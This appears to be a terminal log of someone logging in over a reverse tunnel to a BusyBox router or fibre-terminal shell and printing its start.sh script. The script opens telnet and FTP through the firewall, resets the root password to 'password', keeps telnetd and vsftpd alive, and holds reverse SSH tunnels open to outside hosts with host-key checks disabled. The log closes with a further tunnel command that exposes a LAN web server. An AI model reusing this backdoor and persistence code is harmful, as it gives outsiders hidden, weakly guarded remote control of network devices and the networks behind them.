fire@instance-20260110-191532:~$ telnet 127.0.0.1 2100            Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

reliance.reliance login: root
Password:
Login incorrect
reliance.reliance login: password
Login incorrect
reliance.reliance login: root
Password:


BusyBox v1.17.4 (2023-03-21 16:05:25 IST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

RIL> ls
bin         flash       linuxrc     run         userfs
dev         flash2      mnt         sbin        usr
dev.tar.gz  home        pfrm2.0     sys         var
etc         lib         proc        tmp
RIL> ls flash
AddnSoftVer                  lighttpd.conf
RSTOTJF00025126_JCO4032.enc  log.txt
TF1_first_boot_completed2    nohup.out
TLSCERT                      ont_dc.conf
busybox.bin                  ras_proxy_xml
configMerge                  ras_xml
connectionSucceeded          secure
dhcp6c                       smartcable
dms_xml                      ssh
dscpTo8021Pconfig.lua        start.sh
firmMd5sum                   teamf1.cfg.ascii
firmwareVersionInfo          teamf1.cfg.ascii.bkp
gcp                          telnetDisableACS
https.crt                    thirdparty
https.key                    tmp
juice                        tmux.bin
k                            tr69
k.pem                        twine
lighttpd                     vsftpd.conf
lighttpd.bin                 webdav
RIL> cat start.sh
cat: can't open 'start.sh': No such file or directory
RIL> cat ls/start.sh
cat: can't open 'ls/start.sh': No such file or directory
RIL> cat flash/start.sh
#!/bin/sh
sleep 17

echo '. /flash/.profile' >> /etc/profile
. /etc/profile

/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT
/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 21 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT

sshst() {
tmux new-session -d "/flash/ssh -i /flash/k.pem \
  -o ServerAliveCountMax=3 \
  -o ServerAliveInterval=30 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -R 2100:localhost:23 ubuntu@52.2.215.51"
  }
sshst1() {
tmux new-session -d "/flash/ssh -i /flash/gcp \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -R 2100:localhost:23 fire@blackcatdire.duckdns.org"
  }

LOG=/flash/log.txt

rm -f $LOG

echo "[$(date)] Starting watchdog" >> $LOG

nohup /usr/sbin/telnetd >> $LOG 2>&1 &
echo -e "password\npassword" | passwd root >> $LOG 2>&1
nohup vsftpd /flash/vsftpd.conf >> $LOG 2>&1 &



while true; do
    pid=$(pidof telnetd)
    if [ -z "$pid" ]; then
        echo "[$(date)] telnetd is dead. Restarting..." >> $LOG
        nohup /usr/sbin/telnetd >> $LOG 2>&1 &
        echo -e "password\npassword" | passwd root >> $LOG 2>&1

    fi
    sleep 5
done &

while true; do
    pid=$(pidof vsftpd)
    if [ -z "$pid" ]; then
        echo "[$(date)] vsftpd is dead. Restarting..." >> $LOG
        nohup vsftpd /flash/vsftpd.conf >> $LOG 2>&1 &
    fi
    sleep 5
done &
while true; do
    pid=$(pidof ssh)
    if [ -z "$pid" ]; then
        echo "[$(date)] ssh is dead. Restarting..." >> $LOG
        sshst1
    fi
    sleep 5
done &

RIL> pgrep vsftpd
13060
RIL>

/flash/ssh -i /flash/gcp \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -R 2101:192.168.29.131:80 fire@34.41.214.219

tmux new-session -d "/flash/ssh -i /flash/gcp \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -R 2101:192.168.29.131:80 fire@34.41.214.219"
